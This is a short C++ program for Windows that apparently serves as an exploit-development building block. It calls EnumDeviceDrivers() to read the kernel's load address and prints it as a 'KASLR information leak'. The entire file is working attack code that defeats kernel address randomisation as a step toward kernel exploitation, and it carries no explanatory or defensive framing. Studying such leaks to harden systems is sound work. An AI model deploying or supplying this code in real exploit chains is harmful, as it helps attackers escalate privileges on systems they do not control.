#include <windows.h>
#include <iostream>
#include <Psapi.h>

int main() {

	LPVOID drivers[1024];
	DWORD cbNeeded;

	BOOL enumVar = EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
	std::cout << "[+] Preparing KASLR information leak with EnumDeviceDrivers()\n";
	std::cout << "[+] Getting kernel base address\n";
	PVOID KernelBaseAddress = { 0 };
	KernelBaseAddress = drivers[0];

	if (enumVar == 0) {

		TCHAR  err[256];
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, 255, NULL);

		std::cout << "kASLR leakage failed! - " << err << std::endl;
		std::cout << "This probably means your of low integrity!\n";
	}
	else {
		std::cout << "[+] Successfully leaked the kernel base address\n";
		std::cout << "\t[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;
	}

	return 0;
}
